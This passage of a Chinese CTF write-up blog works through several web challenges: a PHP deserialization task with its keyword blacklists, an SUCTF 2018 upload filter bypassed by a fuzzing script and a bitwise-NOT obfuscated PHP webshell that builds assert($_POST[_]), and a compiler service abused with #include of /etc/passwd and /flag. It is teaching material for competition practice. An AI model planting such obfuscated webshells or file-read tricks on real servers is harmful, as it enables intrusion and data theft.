<br>&lt;title&gt;login&lt;/title&gt;<br>&lt;center&gt;<br>&lt;form action=<span class="hljs-string">&quot;login.php&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> style=<span class="hljs-string">&quot;margin-top: 300&quot;</span>&gt;<br>&lt;h2&gt;百万前端的用户信息管理系统&lt;/h2&gt;<br>&lt;h3&gt;半成品系统 留后门的程序员已经跑路&lt;/h3&gt;<br>        &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;username&quot;</span> placeholder=<span class="hljs-string">&quot;UserName&quot;</span> required&gt;<br>&lt;br&gt;<br>&lt;input type=<span class="hljs-string">&quot;password&quot;</span> style=<span class="hljs-string">&quot;margin-top: 20&quot;</span> name=<span class="hljs-string">&quot;password&quot;</span> placeholder=<span class="hljs-string">&quot;password&quot;</span> required&gt;<br>&lt;br&gt;<br>&lt;button style=<span class="hljs-string">&quot;margin-top:20;&quot;</span> type=<span class="hljs-string">&quot;submit&quot;</span>&gt;登录&lt;/button&gt;<br>&lt;br&gt;<br>&lt;img src=<span class="hljs-string">&#x27;img/1.jpg&#x27;</span>&gt;大家记得做好防护&lt;/img&gt;<br>&lt;br&gt;<br>&lt;br&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$user</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">user</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]))&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i&quot;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;br&gt;Damn you, hacker!&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i&quot;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Damn you, hacker!&quot;</span>);<br>&#125;<br><span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;/form&gt;<br>&lt;/center&gt;<br><span class="hljs-comment">//update.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib.php&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;html&gt;</span><br><span class="hljs-string">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="hljs-string">&lt;title&gt;update&lt;/title&gt;</span><br><span class="hljs-string">&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;</span><br><span class="hljs-string">&lt;/html&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>]!=<span class="hljs-number">1</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你还没有登陆呢！&quot;</span>;<br>&#125;<br><span class="hljs-variable">$users</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-variable">$users</span>-&gt;<span class="hljs-title function_ invoke__">update</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>]===<span class="hljs-number">1</span>)&#123;<br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>看着像<code>pop</code>链？我们从<code>update.php</code>这个入口开始看：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//update.php</span><br><span class="hljs-variable">$users</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-variable">$users</span>-&gt;<span class="hljs-title function_ invoke__">update</span>();<br></code></pre></td></tr></table></figure><p><code>new</code>了一个<code>User</code>，跟踪到<code>update()</code>方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$Info</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">getNewinfo</span>());<br>        <span class="hljs-variable">$age</span>=<span class="hljs-variable">$Info</span>-&gt;age;<br>        <span class="hljs-variable">$nickname</span>=<span class="hljs-variable">$Info</span>-&gt;nickname;<br>        <span class="hljs-variable">$updateAction</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">UpdateHelper</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>],<span class="hljs-variable">$Info</span>,<span class="hljs-string">&quot;update user SET age=<span class="hljs-subst">$age</span>,nickname=<span class="hljs-subst">$nickname</span> where id=&quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br>        <span class="hljs-comment">//这个功能还没有写完 先占坑</span><br>    &#125;<br></code></pre></td></tr></table></figure><p>反序列化，先找<code>destruct</code>析构：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>       <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;nickname);<span class="hljs-comment">//危</span><br>   &#125;<br></code></pre></td></tr></table></figure><p>后面可能要用到这个<code>file_get_contents</code>进行文件读取</p><p>继续跟踪到<code>getNewinfo</code>，我们可以用<code>POST</code>传参<code>age</code>和<code>nickname</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getNewInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$age</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;age&#x27;</span>];<br>        <span class="hljs-variable">$nickname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">safe</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Info</span>(<span class="hljs-variable">$age</span>,<span class="hljs-variable">$nickname</span>)));<br>    &#125;<br></code></pre></td></tr></table></figure><p>跟踪到<code>info</code>类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$CtrlCase</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$age</span>,<span class="hljs-variable">$nickname</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;age=<span class="hljs-variable">$age</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;nickname=<span class="hljs-variable">$nickname</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$argument</span></span>)</span>&#123; <span class="hljs-comment">//调用对象中不存在的方法时触发</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;CtrlCase-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$argument</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>safe</code>方法：(注意这里进行了字符串替换)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe</span>(<span class="hljs-params"><span class="hljs-variable">$parm</span></span>)</span>&#123;<br>    <span class="hljs-variable">$array</span>= <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;union&#x27;</span>,<span class="hljs-string">&#x27;regexp&#x27;</span>,<span class="hljs-string">&#x27;load&#x27;</span>,<span class="hljs-string">&#x27;into&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;file&#x27;</span>,<span class="hljs-string">&#x27;insert&#x27;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;alter&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$array</span>,<span class="hljs-string">&#x27;hacker&#x27;</span>,<span class="hljs-variable">$parm</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>终点是<code>unserialize($this-&gt;getNewinfo())</code>，利用析构函数<code>file_get_contents($this-&gt;nickname)</code>去读<code>flag.php</code>，但<code>safe</code>这个函数直接把<code>flag</code>给替换成<code>hacker</code>。</p><p>吗的这里想了半天不知道怎么搞。。看了其它师傅博客才知道思路错了。。</p><h2 id="SUCTF-2018-GetShell"><a href="#SUCTF-2018-GetShell" class="headerlink" title="[SUCTF 2018]GetShell"></a>[SUCTF 2018]GetShell</h2><p><code>index.php</code>界面存在文件上传功能：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$contents</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]))&#123;<br>    <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$contents</span>,<span class="hljs-number">5</span>);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$black_char</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$b</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$b</span>) !== <span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;illegal char&quot;</span>);<br>        &#125;<br>    &#125;     <br>&#125;<br></code></pre></td></tr></table></figure><p>大致就是先利用<code>file_get_contents</code>函数把上传的文件内容读了，然后从内容第六位开始往后截取。在利用<code>stripos</code>找截取的内容中有没有非法字符。</p><p>参考文章<code>https://blog.csdn.net/mochu7777777/article/details/107729445</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ascii_str</span>():<br>    str_list = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">127</span>): <span class="hljs-comment">#可见：范围32到126</span><br>        str_list.append(<span class="hljs-built_in">chr</span>(i))<br>    <span class="hljs-keyword">return</span> str_list<br><br><br>str_list = ascii_str()<br>url = <span class="hljs-string">&quot;http://bed9fea6-1b2e-4bec-a572-2de786c86bb2.node4.buuoj.cn:81/index.php?act=upload&quot;</span><br>headers = &#123;<span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0&#x27;</span>&#125;<br><br><span class="hljs-keyword">for</span> fuzz <span class="hljs-keyword">in</span> str_list:<br>    files = &#123;<br>        <span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;1.php&#x27;</span>, <span class="hljs-string">&quot;12345&quot;</span> + fuzz, <span class="hljs-string">&#x27;text/plain&#x27;</span>)<br>    &#125;<br>    response = requests.post(url=url, headers=headers, files=files)<br>    res = response.text<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Stored&#x27;</span> <span class="hljs-keyword">in</span> res:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;该字符可以通过:  &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(fuzz))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;过滤字符:  &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(fuzz))<br><br><br></code></pre></td></tr></table></figure><p><code>$ ( ) . ; = [ ] _ ~</code>能用，汉字也可以。接下来可以利用取反+汉字的方法去拿想要的字母，比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">&gt;&gt;&gt; <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;卢&quot;</span>.<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-string">&quot;utf8&quot;</span>))<br>b<span class="hljs-string">&#x27;\xe5\x8d\xa2&#x27;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=<span class="hljs-string">&quot;卢&quot;</span>;<br><span class="hljs-keyword">print</span>(~(<span class="hljs-variable">$_</span>&#123;<span class="hljs-number">1</span>&#125;));<br><span class="hljs-keyword">print</span>(~<span class="hljs-string">&quot;\x8d&quot;</span>);<br><span class="hljs-comment">// 输出rr</span><br>参考：`https:<span class="hljs-comment">//xz.aliyun.com/t/8107#toc-1`</span><br></code></pre></td></tr></table></figure><p>脚本小子偷了这位师傅的脚本：<code>https://blog.csdn.net/mochu7777777/article/details/107729445</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//Author: m0c1nu7 </span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str_split_unicode</span>(<span class="hljs-params"><span class="hljs-variable">$str</span>, <span class="hljs-variable">$l</span> = <span class="hljs-number">0</span></span>) </span>&#123;<br> <br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$l</span> &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable">$len</span> = <span class="hljs-title function_ invoke__">mb_strlen</span>(<span class="hljs-variable">$str</span>, <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len</span>; <span class="hljs-variable">$i</span> += <span class="hljs-variable">$l</span>) &#123;<br>            <span class="hljs-variable">$ret</span>[] = <span class="hljs-title function_ invoke__">mb_substr</span>(<span class="hljs-variable">$str</span>, <span class="hljs-variable">$i</span>, <span class="hljs-variable">$l</span>, <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$ret</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_split</span>(<span class="hljs-string">&quot;//u&quot;</span>, <span class="hljs-variable">$str</span>, -<span class="hljs-number">1</span>, PREG_SPLIT_NO_EMPTY);<br>&#125;<br> <br><span class="hljs-variable">$s</span> = <span class="hljs-string">&#x27;你归来是诗离去成词且笑风尘不敢造次我糟糠能食粗衣也认煮酒话桑不敢相思你终会遇见这么一个人他会用整个人生将你精心收藏用漫长岁月把你妥善安放怕什么岁月漫长你心地善良,终会有一人陪你骑马喝酒走四方为你唱一首歌歌中有你亦有我我的泪我的魅将都融入到我的歌声里飘向孤独的你你是否听到了我的歌曲是否也在黯然落泪？岁月匆匆人生漫漫漠视了真情谁是站谁的谁已经变得不重要至少曾经已拥有长相思爱相随时空隔离谁相陪？花前月下心随风相思一片梦成空笑看往事红尘中多少凝思付清秋？长相思泪相随曾经谁是谁的谁？孤星冷月泪盈盈念曾经相逢心长时光短让人垂泪到天明长相思苦相随窗前双燕比翼飞日暮情人成双对于时光无垠的田野中没有早一步也没有晚一步恰好遇见了想要遇见的人这是一段多少美丽而令人心动的尘缘于爱情来说相见恨早会恨晚站会留下梨花带雨的疼痛而于友情来说无论太早或者太迟都是一份值得珍惜的情缘晚秋缓缓走晚了我的轮回疏雨一刻半疏笼起我深深的梦馀昨日遗憾寸寸疏雨挑涸泪烛落笔无处飒晚秋彼晚秋未晚懒我疏雨疏风去归我初心还我清梦唯我在晚秋未晚里守望那疏雨半疏的麦田待下一片梧桐叶复舞我亦拾起我的旧梦旧梦清寒一枕乱我眸中晚秋躞蹀的雨疏疏拍窗我的晚秋疏雨半疏疏开昨日我的梦情缘如海深邃澈蓝干涸成妄谈一湛清湖泪潸然一颦寒眉锁阑珊只为你而欣悦只因你而清泪斑斑你是我的前世吧为何沁泊在我的心怀缱绻起涟波千层驻我心扉知我情怀从此我已习惯你的嘘寒问暖懒倦地痴卧在你的胸怀红霞满腮昨天再苦都要用今天的微笑把它吟咏成一段幸福的记忆；曾经再累都要用当站下的遗忘穿越万道红尘让心波澜不惊人生最大的荣耀不在于从不跌倒而在于每一次跌倒后都能爬起来回忆是件很累的事就像失眠时怎么躺都不对的样子有时候往往直到离开在回忆里才能知道自己有多喜欢一座城&#x27;</span>;<br><br><span class="hljs-variable">$arr_str</span>=<span class="hljs-title function_ invoke__">str_split_unicode</span>(<span class="hljs-variable">$s</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>) ; <span class="hljs-variable">$i</span>++) &#123; <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$arr_str</span>[<span class="hljs-variable">$i</span>].<span class="hljs-string">&#x27; ------- &#x27;</span>.~<span class="hljs-variable">$arr_str</span>[<span class="hljs-variable">$i</span>][<span class="hljs-number">1</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>&#125;<br> <br> <span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>结果类似这种，然后一个一个拼接成一句话就行：</p><p><img src="/img/suctf2018getshell1.png" alt="suctf2018getshell1"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$__</span> = [];<br><span class="hljs-variable">$_</span> = (<span class="hljs-variable">$__</span> == <span class="hljs-variable">$__</span>); <span class="hljs-comment">// 这里结果是1</span><br><br><span class="hljs-variable">$__</span> = ~(垂); <span class="hljs-comment">//利用这个拿a</span><br><span class="hljs-variable">$___</span> = <span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>]; <span class="hljs-comment">//数组形式，1索引取反得a</span><br><br><span class="hljs-variable">$__</span> = ~(匆); <span class="hljs-comment">//利用这个拿s</span><br><span class="hljs-variable">$___</span> .= <span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>].<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-comment">//ass</span><br><span class="hljs-variable">$__</span> = ~(随);<br><span class="hljs-variable">$___</span> .= <span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-comment">//asse</span><br><span class="hljs-variable">$__</span> = ~(千);<br><span class="hljs-variable">$___</span> .= <span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-comment">//asser</span><br><span class="hljs-variable">$__</span> = ~(苦);<br><span class="hljs-variable">$___</span> .= <span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-comment">//assert</span><br><br><span class="hljs-variable">$____</span> = ~(~(_));<span class="hljs-comment">//_</span><br><span class="hljs-variable">$__</span> = ~(诗);<br><span class="hljs-variable">$____</span> .= <span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-comment">//_P</span><br><span class="hljs-variable">$__</span> = ~(尘);<br><span class="hljs-variable">$____</span> .= <span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-comment">//_PO</span><br><span class="hljs-variable">$__</span> = ~(欣);<br><span class="hljs-variable">$____</span> .= <span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-comment">//_POS</span><br><span class="hljs-variable">$__</span> = ~(站);<br><span class="hljs-variable">$____</span> .= <span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-comment">//_POST</span><br><br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$$____</span>;<span class="hljs-comment">//$_POST</span><br><span class="hljs-variable">$___</span>(<span class="hljs-variable">$_</span>[_]);<span class="hljs-comment">//assert($_POST[_])</span><br><br></code></pre></td></tr></table></figure><p>这东西随便起个名字，然后注意空格和注释都要去掉</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$__</span>=[];<br><span class="hljs-variable">$_</span>=(<span class="hljs-variable">$__</span>==<span class="hljs-variable">$__</span>);<br><span class="hljs-variable">$__</span>=~(融);<br><span class="hljs-variable">$___</span>=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(匆);<br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>].<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(随);<br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(千);<br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(苦);<br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$____</span>=~(~(_));<br><span class="hljs-variable">$__</span>=~(诗);<br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(尘);<br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(欣);<br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(站);<br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$$____</span>;<br><span class="hljs-variable">$___</span>(<span class="hljs-variable">$_</span>[_]);<br></code></pre></td></tr></table></figure><p>上传后直接访问路径(注意它会自动把后缀改成<code>php</code>)，注意<code>flag</code>在<code>phpinfo</code>里，或者直接<code>system(&quot;env&quot;)</code>。</p><h2 id="FireshellCTF2020-Caas"><a href="#FireshellCTF2020-Caas" class="headerlink" title="[FireshellCTF2020]Caas"></a>[FireshellCTF2020]Caas</h2><p><img src="/img/fireshellctfcass1.png" alt="fireshellctfcass1"></p><p>编译页面，输入后会把结果下载出来。看了报错好像是个c的编译器？这里抓包看看是否存在任意文件下载：</p><p><img src="/img/fireshellctfcss2.png" alt="fireshellctfcss2"></p><p>emm好像不存在了</p><p><a href="https://blog.csdn.net/qq_54929891/article/details/124781749">参考文章</a></p><blockquote><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> 命令告诉预处理器将指定头文件的内容插入到预处理器命令的相应位置</span><br></code></pre></td></tr></table></figure></blockquote><p><code>#include &lt;/etc/passwd&gt;</code></p><p>包含一个文件作为头文件时。会由于文件内容不能解析而报错</p><p><img src="/img/fireshellctf4.png" alt="fireshellctf4"></p><p><code>#include &quot;/flag&quot;</code></p><p>注意这里要用双引号包裹而不是箭头，双引号范围比箭头更大。</p><h2 id="HarekazeCTF2019-Avatar-Uploader-1"><a href="#HarekazeCTF2019-Avatar-Uploader-1" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 1"></a>[HarekazeCTF2019]Avatar Uploader 1</h2><p><img src="/img/avatarupload1.png" alt="avatarupload1"></p><p>要求上传<code>PNG</code>而且小于<code>256kB</code>和<code>256px*256px</code>。</p><p>找了个一句话木马传过去但是被检测了：</p><p><img src="/img/avauploader2.png" alt="avauploader2"></p><p>这SESSION看着像<code>JWT</code>?，解一下看看:</p><p><img src="/img/avauploader3.png" 